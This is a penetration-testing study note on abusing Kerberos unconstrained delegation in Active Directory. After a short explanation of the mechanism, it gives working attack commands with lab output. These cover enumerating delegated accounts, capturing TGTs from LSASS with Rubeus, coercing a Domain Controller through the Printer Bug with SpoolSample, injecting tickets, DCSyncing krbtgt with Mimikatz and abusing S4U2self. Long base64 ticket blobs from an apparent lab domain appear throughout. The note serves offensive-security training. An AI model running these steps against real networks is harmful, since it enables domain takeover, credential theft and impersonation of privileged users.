---
created: 2026-10-23
updated: 2026-10-24
---
### Unconstrained delegation (KUD)

> **Unconstrained delegation (KUD)** is a legacy Kerberos delegation mode that lets a designated account (a computer, user, or service account) impersonate a user to *any* service in the domain, without restriction.

- When a user authenticates to a service whose account is configured for unconstrained delegation, the client **forwards a copy of the user's TGT** (Ticket-Granting Ticket) to that service. The service caches the TGT, along with its session key, in the LSASS memory of the host the service runs on.
- Holding the user's TGT, the service can then request service tickets as that user and reach **any service in the domain** on their behalf.
---
- Unconstrained delegation can be set on **computer, user, and service accounts**. Domain Controllers are configured for it by default.
---
- KUD is enabled by the `TRUSTED_FOR_DELEGATION` bit in the account's `userAccountControl` (UAC) attribute (`0x80000`, decimal `524288`).
- LDAP filter for finding accounts with the `TRUSTED_FOR_DELEGATION` flag set: `(userAccountControl:1.2.840.113556.1.4.803:=524288)`.
---
- Only forwardable TGTs (those with the `forwardable` flag set) can be forwarded to a delegated service. In AD this flag is set by default, so normally every account can be delegated.
- The client must already be authenticated (hold a TGT) before it can obtain the ST (Service Ticket) and forward its credentials.

>[!note]- How the user's TGT reaches the service
>
> - During the TGS exchange, the KDC (Key Distribution Center) sets the **`ok-as-delegate`** flag on the ST issued for a service whose account is trusted for delegation. This flag signals the client that the target is configured for delegation.
> - The client sees the flag and requests a **forwarded TGT** (a copy of its own TGT, marked `forwarded`, with its own session key) from the KDC. The client then embeds the `forwarded` TGT inside the `AP-REQ` (as a `KRB-CRED` structure in the authenticator, encrypted with the service session key) and sends it to the service.
> - The service decrypts it, extracts the TGT and its session key, and caches both in LSASS, ready to impersonate the user.
>
>>[!note] See [[Kerberos#Ticket flags]] and [`Ticket Flag Details — Microsoft Learn`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/de260077-1955-447c-a120-af834afe45c2).

>[!important] Accounts marked **`Account is sensitive and cannot be delegated`** (`NOT_DELEGATED`, UAC `0x100000`) and members of the **`Protected Users`** group **can't be delegated**: the KDC issues their TGTs **without the `forwardable` flag**, so no service can forward them.

- Because a real TGT is cached by the delegated service, the host it runs on accumulates the TGTs of **every account that connects to it**, including privileged users and computer accounts. That is what makes this configuration dangerous.

>[!important] Unconstrained delegation is a property of an **account** (`TRUSTED_FOR_DELEGATION` on the account), not of a host.

>[!note] See [[Kerberos#Unconstrained delegation]] and [[Kerberos#Kerberos delegation]].

## Unconstrained delegation attacks

- If you compromise an account configured for unconstrained delegation, you can harvest the TGTs forwarded to it and reuse them to authenticate as those users.
- How you attack it depends on which kind of account is configured for KUD, since that determines where the forwarded TGTs are cached and what you have to do to get them:
	- **Computer account** — the account represents a machine's own identity, and any delegated services that run as that machine. The forwarded TGTs are stored in **that machine's LSASS memory**, so you need to compromise the machine itself (local `Administrator`/`SYSTEM`) and read the TGTs from memory. See [[#Attacking a computer account]].
	- **User or service account** — KUD is configured for a service account, and that account isn't bound to a machine you're compromised. In this case, you add an SPN to that account pointing at a host you control, coercing a victim to authenticate to it, and decrypt any forwarded TGT using the account's long-term key (NT hash). See [[#Attacking a user or service account]].
- Either way, the result is the same: you obtain the TGTs of the users (and machines) that authenticate, and reuse them to impersonate those principals ([[Pass-the-Ticket]]).
### Finding unconstrained delegation

#### From Windows

- Enumerate **computer accounts** with unconstrained delegation using [`Get-DomainComputer`](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainComputer/) (`PowerView`):

```powershell
Import-Module .\PowerView.ps1
```
```powershell
Get-DomainComputer -Unconstrained | Select-Object Name,DistinguishedName
```

>[!example]-
> ```powershell
> PS C:\Tools> Import-Module .\PowerView.ps1
> ```
> 
> ```powershell
> PS C:\Tools> Get-DomainComputer -Unconstrained | Select-Object Name, DistringuishedName
> ```
> 
> ```powershell
> name  DistringuishedName
> ----  ------------------
> DC01
> SQL01
> 
> ```

- Using PowerShell (the `ActiveDirectory` module):

```powershell
Import-Module ActiveDirectory
```
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

- Enumerate **user and service accounts** with unconstrained delegation (rare, exploited differently) using [`Get-DomainUser`](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) (`PowerView`):

```powershell
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```

>[!example]-
> ```powershell
> PS C:\Tools> Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
> ```
> 
> ```powershell
> pwdlastset            : 10/14/2022 6:59:52 AM
> usncreated            : 12612
> lastlogoff            : 12/31/1600 6:00:00 PM
> badpwdcount           : 0
> name                  : callum.dixon
> samaccounttype        : USER_OBJECT
> samaccountname        : callum.dixon
> whenchanged           : 10/19/2022 8:25:59 AM
> objectsid             : S-1-5-21-1870146311-1183348186-593267556-1107
> lastlogon             : 12/31/1600 6:00:00 PM
> objectclass           : {top, person, organizationalPerson, user}
> codepage              : 0
> cn                    : callum.dixon
> usnchanged            : 20501
> primarygroupid        : 513
> logoncount            : 0
> countrycode           : 0
> dscorepropagationdata : {10/19/2022 8:25:59 AM, 1/1/1601 12:00:00 AM}
> useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_FOR_DELEGATION
> accountexpires        : NEVER
> distinguishedname     : CN=callum.dixon,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
> whencreated           : 10/14/2022 11:59:52 AM
> badpasswordtime       : 12/31/1600 6:00:00 PM
> instancetype          : 4
> objectguid            : 8881928a-af16-4d91-809e-8d91a7cd45ed
> objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
> ```

- Using PowerShell (the `ActiveDirectory` module):

```powershell
Import-Module ActiveDirectory
```
```powershell
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,ServicePrincipalName
```

>[!note] Domain Controllers are trusted for unconstrained delegation by default, so they always appear in the results. They aren't useful as targets, since exploiting a DC already requires DC-level access. 
> - To exclude DCs from the results in `PowerView`:
>```powershell
>Get-DomainComputer -Unconstrained | ? { $_.primarygroupid -ne 516 } | select-object name
>```

#### From Linux

- List all accounts trusted for delegation using [`NetExec`](https://www.netexec.wiki/ldap-protocol/unconstrained-delegation):

```bash
nxc ldap 10.10.11.5 -u 'jdoe' -p 'passwd123' --trusted-for-delegation
```

- Using Impacket's [`findDelegation.py`](https://github.com/fortra/impacket/blob/master/examples/findDelegation.py):

```bash
findDelegation.py example.com/'jdoe':'passwd123' -dc-ip 10.10.11.5
```

## Attacking a computer account

- With local `Administrator` (or `SYSTEM`) on a computer whose account is configured for unconstrained delegation, you can read the forwarded TGTs cached in its LSASS. 
- There are two ways to get a privileged TGT onto the host:
	- **Wait** for a privileged user to authenticate to it, then capture their TGT.
	- **Coerce** a privileged machine (e.g. a Domain Controller) into authenticating to it on demand (see [[#Coercing authentication with the Printer Bug]]).

### Capturing TGTs with `Rubeus monitor`

- [`Rubeus`](https://github.com/GhostPack/Rubeus)'s [`monitor`](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/extraction/monitor), run as local `Administrator`, can be used to watch for newly cached TGTs and print each one (Base64-encoded) as it appears:

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```

>[!note]- `Rubeus monitor` option breakdown
>| Option | Description |
>| - | - |
>| `/interval` | Set the polling interval in seconds (default `60`). |
>| `/filteruser` | Show only tickets whose username matches a pattern (wildcards, e.g. `admin`). |
>| `/targetuser` | Restrict monitoring to a single username. |
>| `/registry` | Also watch the LSA ticket cache in the registry for new tickets. |
>| `/nowrap` | Print the Base64 ticket without line wrapping (easier to copy). |


>[!example]-
> ```powershell
> PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap
>```
>
>```powershell 
>    ______        _
>   (_____ \      | |
>    _____) )_   _| |__  _____ _   _  ___
>   |  __  /| | | |  _ \| ___ | | | |/___)
>   | |  \ \| |_| | |_) ) ____| |_| |___ |
>   |_|   |_|____/|____/|_____)____/(___/
> 
>   v2.2.2
> 
> [*] Action: TGT Monitoring
> [*] Monitoring every 5 seconds for new TGTs
> 
> 
> [*] 10/24/2026 2:40:38 PM UTC - Found new TGT:
> 
>   User                  :  derek.walker@INLANEFREIGHT.LOCAL
>   StartTime             :  10/24/2026 9:19:41 AM
>   EndTime               :  10/24/2026 7:19:41 PM
>   RenewTill             :  10/31/2026 9:19:41 AM
>   Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
>   Base64EncodedTicket   :
> 
>     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
> 
> [*] 10/24/2026 2:40:38 PM UTC - Found new TGT:
> 
>   User                  :  SQL01$@INLANEFREIGHT.LOCAL
>   StartTime             :  10/24/2026 9:19:42 AM
>   EndTime               :  10/24/2026 7:19:42 PM
>   RenewTill             :  10/31/2026 9:19:42 AM
>   Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
>   Base64EncodedTicket   :
> 
>     doIFyDCCBcSgAwIBBaEDAgEWooIEujCCBLZhggSyMIIErqADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggRkMIIEYKADAgESoQMCAQKiggRSBIIETh33eSyBFNX6NRwWAKmZyIoso2iBwJo18iDnitKxbiZzgjtg0h1TvBoZ3GzCD/G78SoAlhG0S24FcZo2QmZ0ae78ossGxd3lbj16+118GunA3GY8o13544JNin6tuep9lZuOxzv5PZaX0vTe90jZNtbhvoHKz/ECnPzmFj5Z3/fW1kd9fSOUPApzPwrHgwkbs8OzIze0GWYIjDYxBFeZeyO8eQ4F2yRybG0/Hh8w1jdd2HoeC7fVZvffn9aoHXC22maesDy6FHBS3N1XzsWb/MGkYujxz9qkMtRtijqrGyJ6Dsd09ssAgLPEgvd9i5YuxqtCKmOAG6YvqPtWmAWwAVhK1WOglJG0kvSphZ4I0PkCanMcyLn4kFcX88BeRShNopSuknG05aXjmwNRUHuU+K3mtB86deDHylNNOewbZ9iG0iGQKr3Usafuf3vsakS1OkphCJBcnkql7l+8SWJbrrIe01tGwPIm+V3tpOm5AJsj5KjNuQf9/EYZUDfDS+xyL2wa/JPC25z83VxABU3d8pgey1jRn7cEKVF5AUNwbVwr/fROs8nZh/jnA5HofzuiWOE+qrYo3sKXh+8efO2CkQJUzvDstuk8D8abAKuk9SmQ//anfmlls6c9ac/drWEofjuhFErzcZ6zoIFjwPFS2Dh8kOle7kJVQKzimhqvHMsxHbS+x79bg8TNZt4fK0rgZl7QCNiKHfmMF64oXQAKmLTgvEsXX5m60JK6udXW+7w8QiFQAPLgBoC+7a7xNIS6I7XfcC+A9/7UbDEDwqDpLnkkcbDomy6Mvn5Qe1euzAALkpqkuTM8y5pKok4WjvkRwZZzlZoxf0uvHfUDDI7KLENS9wrri7KnVKZ7q/UVcrapZcY6liRqPqrPFcZZhVlgiri5O2NB9unW7gggJqzyay96hTj13+smn4+QCUFBy5cbttKWAsxDJ28wjtsZQsehT/yOzs+DEZExzX74mVF//tVJWTgxIo+tBZrRSDs1VCdoa0eXoRa+B/eftuvsCstlHz5SuTwNThK+uoZXoBK57J1zzE1Ik+JfIduMI0iTDPK7mcnOMloWI2JYRHYWYjrDyEIUyQdiccrtbYiLX889pC10DRwDvPawfJx1a6D4ySbxBF3I/so2Vv/jDdgaXv5vqEvhvZIxf4rhAk2+TylQccb9B2rHZrutGdwy0DrXlQhKmTZtHkGaOi8Ml0JRid92eLA++dapck2EwHpZWLzd7bYetb1O/MfBnM+dfKp+sQ2zZQv7x+9Vbdwz4i1sl72urrlBCuk0CgHQOjri9zdllGa+K9Skj3C3ny3zweQmoNUK3vuKI9JaLfDkZnkPim/X29RsyV0/x6la12qOZ7F7IEE+Fhlu0Zu+3vthecCs3CY3yGN4Yk7xgXPCyynnyG/VR+GdRsjXzB8oEDLKuV/DVV8186mlOT3MaFepGCzaKjDlCYA4LzR/xn7/RrepCp2jgfkwgfagAwIBAKKB7gSB632B6DCB5aCB4jCB3zCB3KArMCmgAwIBEqEiBCDVymiWQFpnuXRV9TR7oRkw23CXCT9ebi473t3/nnUd36EVGxNJTkxBTkVGUkVJR0hULkxPQ0FMohMwEaADAgEBoQowCBsGU1FMMDEkowcDBQBA4QAApREYDzIwMjYxMDI0MTQxOTQyWqYRGA8yMDI2MTAyNTAwMTk0MlqnERgPMjAyNjEwMzExNDE5NDJaqBUbE0lOTEFORUZSRUlHSFQuTE9DQUypKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUw=
> ```

- Check the group memberships of the captured account (for example, whether it belongs to `Domain Admins`) using [`Get-DomainGroup`](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroup/) (`PowerView`):

```powershell
Get-DomainGroup -MemberIdentity jdoe
```

>[!example]- 
> ```powershell
> PS C:\Tools> Get-DomainGroup -MemberIdentity SQL01$
> ```
> 
> ```powershell
> usncreated             : 12330
> iscriticalsystemobject : True
> grouptype              : GLOBAL_SCOPE, SECURITY
> samaccountname         : Domain Computers
> whenchanged            : 10/14/2022 11:51:29 AM
> objectsid              : S-1-5-21-1870146311-1183348186-593267556-515
> objectclass            : {top, group}
> cn                     : Domain Computers
> usnchanged             : 12332
> dscorepropagationdata  : {10/14/2022 11:51:29 AM, 1/1/1601 12:00:01 AM}
> name                   : Domain Computers
> description            : All workstations and servers joined to the domain
> distinguishedname      : CN=Domain Computers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
> samaccounttype         : GROUP_OBJECT
> whencreated            : 10/14/2022 11:51:29 AM
> instancetype           : 4
> objectguid             : 9dbff827-b408-4e88-b096-e1871d7df191
> objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
> ```
### Coercing authentication with the Printer Bug

- The **Printer Bug** is a design flaw in [`MS-RPRN`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) (Print System Remote Protocol). Any domain user can bind to the `\pipe\spoolss` named pipe, call `RpcOpenPrinter`, then `RpcRemoteFindFirstPrinterChangeNotificationEx`, and force the target (if its `Print Spooler` service is running) to authenticate back to an arbitrary host over SMB.
- Combined with unconstrained delegation, it coerces a privileged machine, such as a Domain Controller, to authenticate to the computer you've compromised, so that machine's **machine account TGT** (`DC01$`) lands in your host's LSASS.

>[!note] This is a forced-authentication / coercion primitive (see [`T1187 — Forced Authentication — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1187/)). The `Print Spooler` is just one of the possible triggers; when the spooler service is disabled, you can use, for example, `PetitPotam`/MS-EFSR or `DFSCoerce`.

- Start `Rubeus monitor` on the compromised host, then trigger the coercion from the same host with [`SpoolSample`](https://github.com/leechristensen/SpoolSample). Its syntax is `SpoolSample.exe <target server> <capture server>`:

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```
```powershell
.\SpoolSample.exe dc01.example.com sql01.example.com
```

>[!note] If the target DC's spooler is disabled, you can run the attack against any other computer in the domain, then abuse the captured computer TGT with `S4U2self` or forge [[Silver Ticket]]s with that machine account's key.

### Using the captured ticket

- Renew the captured TGT and inject it into the current session with `Rubeus`'s [`renew`](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/ticket-requests/renew) (useful if the captured ticket is near expiry):

```powershell
.\Rubeus.exe renew /ticket:<Base64 TGT> /ptt
```

>[!example]-
> ```powershell
> PS C:\Tools> .\Rubeus.exe renew /ticket:doIFyDCCBcSgAwIBBaEDAgEWooIEujCCBLZhggSyMIIErqADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggRkMIIEYKADAgESoQMCAQKiggRSBIIETh33eSyBFNX6NRwWAKmZyIoso2iBwJo18iDnitKxbiZzgjtg0h1TvBoZ3GzCD/G78SoAlhG0S24FcZo2QmZ0ae78ossGxd3lbj16+118GunA3GY8o13544JNin6tuep9lZuOxzv5PZaX0vTe90jZNtbhvoHKz/ECnPzmFj5Z3/fW1kd9fSOUPApzPwrHgwkbs8OzIze0GWYIjDYxBFeZeyO8eQ4F2yRybG0/Hh8w1jdd2HoeC7fVZvffn9aoHXC22maesDy6FHBS3N1XzsWb/MGkYujxz9qkMtRtijqrGyJ6Dsd09ssAgLPEgvd9i5YuxqtCKmOAG6YvqPtWmAWwAVhK1WOglJG0kvSphZ4I0PkCanMcyLn4kFcX88BeRShNopSuknG05aXjmwNRUHuU+K3mtB86deDHylNNOewbZ9iG0iGQKr3Usafuf3vsakS1OkphCJBcnkql7l+8SWJbrrIe01tGwPIm+V3tpOm5AJsj5KjNuQf9/EYZUDfDS+xyL2wa/JPC25z83VxABU3d8pgey1jRn7cEKVF5AUNwbVwr/fROs8nZh/jnA5HofzuiWOE+qrYo3sKXh+8efO2CkQJUzvDstuk8D8abAKuk9SmQ//anfmlls6c9ac/drWEofjuhFErzcZ6zoIFjwPFS2Dh8kOle7kJVQKzimhqvHMsxHbS+x79bg8TNZt4fK0rgZl7QCNiKHfmMF64oXQAKmLTgvEsXX5m60JK6udXW+7w8QiFQAPLgBoC+7a7xNIS6I7XfcC+A9/7UbDEDwqDpLnkkcbDomy6Mvn5Qe1euzAALkpqkuTM8y5pKok4WjvkRwZZzlZoxf0uvHfUDDI7KLENS9wrri7KnVKZ7q/UVcrapZcY6liRqPqrPFcZZhVlgiri5O2NB9unW7gggJqzyay96hTj13+smn4+QCUFBy5cbttKWAsxDJ28wjtsZQsehT/yOzs+DEZExzX74mVF//tVJWTgxIo+tBZrRSDs1VCdoa0eXoRa+B/eftuvsCstlHz5SuTwNThK+uoZXoBK57J1zzE1Ik+JfIduMI0iTDPK7mcnOMloWI2JYRHYWYjrDyEIUyQdiccrtbYiLX889pC10DRwDvPawfJx1a6D4ySbxBF3I/so2Vv/jDdgaXv5vqEvhvZIxf4rhAk2+TylQccb9B2rHZrutGdwy0DrXlQhKmTZtHkGaOi8Ml0JRid92eLA++dapck2EwHpZWLzd7bYetb1O/MfBnM+dfKp+sQ2zZQv7x+9Vbdwz4i1sl72urrlBCuk0CgHQOjri9zdllGa+K9Skj3C3ny3zweQmoNUK3vuKI9JaLfDkZnkPim/X29RsyV0/x6la12qOZ7F7IEE+Fhlu0Zu+3vthecCs3CY3yGN4Yk7xgXPCyynnyG/VR+GdRsjXzB8oEDLKuV/DVV8186mlOT3MaFepGCzaKjDlCYA4LzR/xn7/RrepCp2jgfkwgfagAwIBAKKB7gSB632B6DCB5aCB4jCB3zCB3KArMCmgAwIBEqEiBCDVymiWQFpnuXRV9TR7oRkw23CXCT9ebi473t3/nnUd36EVGxNJTkxBTkVGUkVJR0hULkxPQ0FMohMwEaADAgEBoQowCBsGU1FMMDEkowcDBQBA4QAApREYDzIwMjYxMDI0MTQxOTQyWqYRGA8yMDI2MTAyNTAwMTk0MlqnERgPMjAyNjEwMzExNDE5NDJaqBUbE0lOTEFORUZSRUlHSFQuTE9DQUypKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUw= /ptt
> ```
> 
> ```powershell
>    ______        _
>   (_____ \      | |
>    _____) )_   _| |__  _____ _   _  ___
>   |  __  /| | | |  _ \| ___ | | | |/___)
>   | |  \ \| |_| | |_) ) ____| |_| |___ |
>   |_|   |_|____/|____/|_____)____/(___/
> 
>   v2.2.2
> 
> [*] Action: Renew Ticket
> 
> [*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
> [*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\SQL01$'
> [+] TGT renewal request successful!
> [*] base64(ticket.kirbi):
> 
>       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
> [+] Ticket successfully imported!
> ```

- Or request a Service Ticket for a target service with `Rubeus`'s [`asktgs`](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/ticket-requests/asktgs) (`/ptt`):

```powershell
.\Rubeus.exe asktgs /ticket:<Base64 TGT> /service:cifs/dc01.example.com /ptt
```

- Request tickets for several services at once (comma-separated SPNs):

```powershell
.\Rubeus.exe asktgs /ticket:<Base64 TGT> /service:cifs/dc01.example.com,ldap/dc01.example.com /ptt
```

>[!note]- `Rubeus asktgs` option breakdown
>
>| Option | Description |
>| - | - |
>| `/ticket` | Supply the TGT (Base64 string or path to a `.kirbi` file). |
>| `/service` | Target SPN(s); separate multiple with commas. |
>| `/ptt` | Inject the resulting ST into the current session ([[Pass-the-Ticket]]). |
>| `/dc` | Send the request to a specific Domain Controller. |
>| `/outfile` | Write the resulting ST to a file. |
>| `/enctype` | Request a specific encryption type (`des`, `rc4`, `aes128`, `aes256`). |
>| `/enterprise` | Use the enterprise principal name format (helps with cross-domain access). |
>| `/u2u` | Request a user-to-user (U2U) ticket. |

- With the ticket injected, you can use native Windows tools (*living off the land*):

```powershell
dir \\dc01.example.com\c$
```

#### Domain Controller TGT: DCSync 

- A DC computer account can be used to replicate directory data, so a captured `DC01$` TGT lets you [[DCSync]] hashes of any domain accounts (including `krbtgt`, which can then be used to forge [[Golden Ticket]]s). 
- You can do that with Mimikatz's `lsadump::dcsync`:

```powershell
lsadump::dcsync /user:example\krbtgt
```

>[!note] See [[DCSync]].

#### Non-DCs: `S4U2self`

- A captured computer account TGT that isn't a DC's can't be used for [[DCSync]].
- Instead, you can abuse **`S4U2self`** (Service for User to Self), a Kerberos extension that lets a service request a Service Ticket **to itself** on behalf of **any user**, without that user's credentials.
- With the machine account's TGT, you can therefore request an ST for a privileged user (e.g. `Administrator`) to a service on **that same host**, and use it to act as that user there. 
- This can be done with `Rubeus`'s [`s4u`](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/delegation/s4u):

```powershell
.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/server01.example.com /ticket:<server01$ TGT> /ptt /nowrap
```

